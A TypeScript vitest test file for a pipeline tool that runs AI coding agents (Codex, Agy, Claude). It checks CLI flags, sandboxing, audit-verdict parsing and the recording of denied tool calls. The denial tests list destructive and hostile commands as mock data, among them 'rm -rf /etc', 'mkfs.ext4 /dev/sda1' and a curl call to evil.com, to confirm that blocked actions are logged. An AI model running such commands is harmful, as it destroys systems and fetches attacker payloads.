import { describe, it, expect, vi, beforeEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { doctor } from '../src/registry/doctor.js';
import { runAgent, runAudit } from '../src/pipeline/agent.js';
import { extract } from '../src/permissions/index.js';
import { Status } from '../src/pipeline/status.js';
import { Git } from '../src/pipeline/git.js';
import { Keys } from '../src/testcheck/keys.js';

describe('Codex Runner Integration', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-codex-test-'));
  });

  describe('doctor with Codex', () => {
    it('verifies codex CLI when configured in agent.harness', () => {
      fs.writeFileSync(path.join(tmpDir, 'sdlc.config.json'), JSON.stringify({
        agent: { harness: 'codex' },
        suites: [{ dir: '.', runner: 'vitest', testCmd: 'vitest run' }],
      }));
      fs.mkdirSync(path.join(tmpDir, 'Docs', 'backlog'), { recursive: true });
      fs.writeFileSync(path.join(tmpDir, 'Docs', 'backlog', 'index.md'), '# Backlog\n');

      const mockWhich = (bin: string) => (bin === 'codex' ? '/usr/local/bin/codex' : null);
      const checks = doctor(tmpDir, { which: mockWhich as any });
      const codexCheck = checks.find(c => c.name === 'codex CLI');
      expect(codexCheck).toBeDefined();
      expect(codexCheck?.ok).toBe(true);
      expect(codexCheck?.detail).toBe('/usr/local/bin/codex');
    });

    it('reports failure when codex is missing on PATH and configured in agent.harness', () => {
      fs.writeFileSync(path.join(tmpDir, 'sdlc.config.json'), JSON.stringify({
        agent: { harness: 'codex' },
        suites: [{ dir: '.', runner: 'vitest', testCmd: 'vitest run' }],
      }));
      fs.mkdirSync(path.join(tmpDir, 'Docs', 'backlog'), { recursive: true });
      fs.writeFileSync(path.join(tmpDir, 'Docs', 'backlog', 'index.md'), '# Backlog\n');

      const mockWhich = (_bin: string) => null;
      const checks = doctor(tmpDir, { which: mockWhich as any });
      const codexCheck = checks.find(c => c.name === 'codex CLI');
      expect(codexCheck).toBeDefined();
      expect(codexCheck?.ok).toBe(false);
      expect(codexCheck?.fix).toContain('install OpenAI Codex CLI');
    });
  });

  describe('runAgent with Codex harness', () => {
    it('dispatches to codex CLI with exec and JSONL streaming flags', async () => {
      const docsDir = path.join(tmpDir, 'docs', 'test-task');
      const logDir = path.join(docsDir, 'logs');
      fs.mkdirSync(logDir, { recursive: true });
      fs.writeFileSync(path.join(docsDir, 'brief.md'), '# Task Brief');

      const capturedRequests: any[] = [];
      const mockSpawn = vi.fn(async (req) => {
        capturedRequests.push(req);
        // Write mock Codex JSONL output
        fs.writeFileSync(req.stdout, [
          JSON.stringify({ type: 'start' }),
          JSON.stringify({ type: 'message', content: 'Codex completed changes.' }),
        ].join('\n'));
        return 0;
      });

      const ctx: any = {
        root: tmpDir,
        config: {
          root: tmpDir,
          backlogDir: 'docs',
          suites: [{ name: 'unit', dir: '.', runner: 'vitest', testCmd: 'vitest run', runCmd: 'vitest run', testGlobs: [], sourceGlobs: [], setup: null, report: null, language: 'typescript', packageManager: 'npm' }],
          integration: null,
          tests: { retry: null, maxWorkers: null },
          lint: null,
          worktree: { base: '', link: [] },
          git: { branchPrefix: 'feat/', base: null, conflictSuffixStart: 1 },
          agent: { harness: 'codex', allowCommands: [], codeSearch: 'none', codeIndexer: null },
          finalise: { envExample: true, maxFileBytes: 1048576 },
          ui: { timezone: 'UTC' },
          node: { version: '22', current: '22', manager: null },
        },
        layout: { root: tmpDir, backlogDir: 'docs', testCmd: 'vitest run', testFiles: 'test/', testDirs: ['test'], sourceDirs: ['src'], link: [], retry: false, maxWorkers: null },
        slug: 'test-task',
        from: 'implement',
        fromN: 4,
        docs: 'docs/test-task',
        log: 'docs/test-task/logs',
        backlog: 'docs/index.md',
        branch: 'feat/test-task',
        env: {},
        envModels: {},
        registryFile: '',
        limits: { maxAttempts: 1, maxTurns: 25, maxRepairTests: 1 },
        git: new Git(tmpDir),
        keys: new Keys({ testDirs: ['test'], globs: [] } as any, tmpDir),
        status: new Status(path.join(logDir, 'status.json'), 'test-task'),
        spawnAgent: mockSpawn,
        promptsDir: path.resolve('assets/prompts'),
        guide: '',
        allowed: ['Bash(npm test:*)'],
        testFileCmd: 'npx vitest run',
        fetchCmd: 'fetch',
        permRepo: path.join(tmpDir, 'sdlc-rules.json'),
        redSha: '',
        lockSha: '',
        origRedSha: '',
        failLog: path.join(logDir, 'tests.log'),
        out: () => {},
        err: () => {},
      };

      await runAgent(ctx, 'implement', 'implement');

      expect(mockSpawn).toHaveBeenCalledTimes(1);
      const req = capturedRequests[0];
      expect(req.command).toBe('codex');
      expect(req.args[0]).toBe('exec');
      expect(req.args).toContain('-C');
      expect(req.args).toContain(tmpDir);
      // No Claude default is translated to a Codex model. Codex chooses its
      // signed-in account default until the project explicitly selects one.
      expect(req.args).not.toContain('-m');
      expect(req.args).toContain('--approve-for-me');
      expect(req.args).not.toContain('-s');
      expect(req.args).toContain('--json');
    });

    it('extracts denied permissions from Codex JSONL output', () => {
      const jsonFile = path.join(tmpDir, 'agent.json');
      const logFile = path.join(tmpDir, 'agent.log');
      const stateFile = path.join(tmpDir, 'permissions.json');

      const codexJsonl = [
        JSON.stringify({ type: 'message', content: 'Attempting to run unauthorized script...' }),
        JSON.stringify({ type: 'tool_denial', tool: 'Bash', command: 'rm -rf /unauthorized', rule: 'dangerous' }),
      ].join('\n');
      fs.writeFileSync(jsonFile, codexJsonl);

      const pendingCount = extract({
        jsonFile,
        logFile,
        stateFile,
        stage: 'implement',
        cwd: tmpDir,
        allowed: [],
      });

      expect(pendingCount).toBe(1);
      const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
      expect(state.pending[0]).toMatchObject({
        stage: 'implement',
        tool: 'Bash',
        detail: 'rm -rf /unauthorized',
      });
    });

    it('runs test audit with codex read-only sandbox', async () => {
      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
      fs.mkdirSync(logDir, { recursive: true });
      const capturedRequests: any[] = [];
      const mockSpawn = vi.fn(async (req) => {
        capturedRequests.push(req);
        fs.writeFileSync(req.stdout, JSON.stringify({ ok: true }));
        return 0;
      });

      const ctx: any = {
        root: tmpDir,
        log: 'docs/test-task/logs',
        config: {
          agent: { harness: 'codex' },
        },
        env: {},
        spawnAgent: mockSpawn,
      };

      await runAudit(ctx, 'audit prompt', { args: [], env: {} });
      expect(mockSpawn).toHaveBeenCalledTimes(1);
      const req = capturedRequests[0];
      expect(req.command).toBe('codex');
      expect(req.args[0]).toBe('exec');
      expect(req.args).toContain('-s');
      expect(req.args).toContain('read-only');
      expect(req.args).toContain('--json');
      expect(req.args).not.toContain('-m');
      expect(req.stdout).toBe(path.join(tmpDir, 'docs', 'test-task', 'logs', 'test-audit.json'));
      expect(req.stderr).toBe(path.join(tmpDir, 'docs', 'test-task', 'logs', 'test-audit.err'));
    });

    it('extracts multi-turn and diverse tool denials from Codex fixtures', () => {
      const jsonFile = path.join(tmpDir, 'agent.json');
      const logFile = path.join(tmpDir, 'agent.log');
      const stateFile = path.join(tmpDir, 'permissions.json');

      const fixtureContent = fs.readFileSync(path.resolve('test/fixtures/codex/tool-denial-variations.jsonl'), 'utf8');
      fs.writeFileSync(jsonFile, fixtureContent);

      const pendingCount = extract({
        jsonFile,
        logFile,
        stateFile,
        stage: 'implement',
        cwd: tmpDir,
        allowed: [],
      });

      expect(pendingCount).toBe(4);
      const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
      const details = state.pending.map((p: any) => p.detail);
      expect(details).toContain('rm -rf /etc');
      expect(details).toContain('curl https://evil.com/payload');
      expect(details).toContain('git push origin main --force');
      expect(details).toContain('mkfs.ext4 /dev/sda1');
    });

    it('extracts text and denials from Agy JSON output format', () => {
      const jsonFile = path.join(tmpDir, 'agy.json');
      const logFile = path.join(tmpDir, 'agy.log');
      const stateFile = path.join(tmpDir, 'permissions.json');

      const agyJson = {
        response: 'Completed Agy planning phase.',
        status: 'OK',
        denied_actions: [
          { tool: 'command', detail: 'pnpm publish', rule: 'danger' },
        ],
      };
      fs.writeFileSync(jsonFile, JSON.stringify(agyJson));

      const pending = extract({
        jsonFile,
        logFile,
        stateFile,
        stage: 'plan',
        cwd: tmpDir,
        allowed: [],
      });

      expect(pending).toBe(1);
      const logText = fs.readFileSync(logFile, 'utf8');
      expect(logText).toContain('Completed Agy planning phase.');
      const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
      expect(state.pending[0]).toMatchObject({
        stage: 'plan',
        tool: 'Bash',
        detail: 'pnpm publish',
      });
    });

    it('parses Codex JSONL test-audit output and ensures VERDICT: VALID regex matches in test-audit.log', async () => {
      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
      fs.mkdirSync(logDir, { recursive: true });

      const auditFixture = fs.readFileSync(path.resolve('test/fixtures/codex/test-audit-valid.jsonl'), 'utf8');
      const mockSpawn = vi.fn(async (req) => {
        fs.writeFileSync(req.stdout, auditFixture);
        return 0;
      });

      const ctx: any = {
        root: tmpDir,
        log: 'docs/test-task/logs',
        config: {
          agent: { harness: 'codex' },
        },
        env: {},
        spawnAgent: mockSpawn,
      };

      const rc = await runAudit(ctx, 'audit prompt', { args: [], env: {} });
      expect(rc).toBe(0);

      // Raw JSONL stored in test-audit.json
      const rawJson = fs.readFileSync(path.join(logDir, 'test-audit.json'), 'utf8');
      expect(rawJson).toContain('audit_msg');

      // Extracted markdown text stored in test-audit.log
      const logContent = fs.readFileSync(path.join(logDir, 'test-audit.log'), 'utf8');
      expect(logContent).toContain('VERDICT: VALID');
      expect(logContent).not.toContain('{"type":');

      // Crucial check: testRepairStage regex /^VERDICT: (VALID|INVALID)$/ must match!
      const verdict = logContent.split('\n').filter(l => /^VERDICT: (VALID|INVALID)$/.test(l)).pop();
      expect(verdict).toBe('VERDICT: VALID');
    });

    it('parses Agy JSON test-audit output and ensures VERDICT: VALID regex matches in test-audit.log', async () => {
      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
      fs.mkdirSync(logDir, { recursive: true });

      const agyAudit = JSON.stringify({
        response: 'Audit complete. Test assertions align with spec.\n\nVERDICT: VALID',
        status: 'OK',
      });
      const mockSpawn = vi.fn(async (req) => {
        fs.writeFileSync(req.stdout, agyAudit);
        return 0;
      });

      const ctx: any = {
        root: tmpDir,
        log: 'docs/test-task/logs',
        config: {
          agent: { harness: 'agy' },
        },
        env: {},
        spawnAgent: mockSpawn,
      };

      const rc = await runAudit(ctx, 'audit prompt', { args: [], env: {} });
      expect(rc).toBe(0);

      const rawJson = fs.readFileSync(path.join(logDir, 'test-audit.json'), 'utf8');
      expect(rawJson).toContain('"response":');

      const logContent = fs.readFileSync(path.join(logDir, 'test-audit.log'), 'utf8');
      expect(logContent).toContain('Audit complete.');
      expect(logContent).not.toContain('"response"');

      const verdict = logContent.split('\n').filter(l => /^VERDICT: (VALID|INVALID)$/.test(l)).pop();
      expect(verdict).toBe('VERDICT: VALID');
    });

    it('handles Claude plain-text test-audit output correctly', async () => {
      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
      fs.mkdirSync(logDir, { recursive: true });

      const claudeText = 'I inspected the tests and verified they pass.\nVERDICT: VALID\n';
      const mockSpawn = vi.fn(async (req) => {
        fs.writeFileSync(req.stdout, claudeText);
        return 0;
      });

      const ctx: any = {
        root: tmpDir,
        log: 'docs/test-task/logs',
        config: {
          agent: { harness: 'claude' },
        },
        env: {},
        spawnAgent: mockSpawn,
      };

      const rc = await runAudit(ctx, 'audit prompt', { args: [], env: {} });
      expect(rc).toBe(0);

      const logContent = fs.readFileSync(path.join(logDir, 'test-audit.log'), 'utf8');
      expect(logContent).toBe(claudeText);

      const verdict = logContent.split('\n').filter(l => /^VERDICT: (VALID|INVALID)$/.test(l)).pop();
      expect(verdict).toBe('VERDICT: VALID');
    });
  });
});
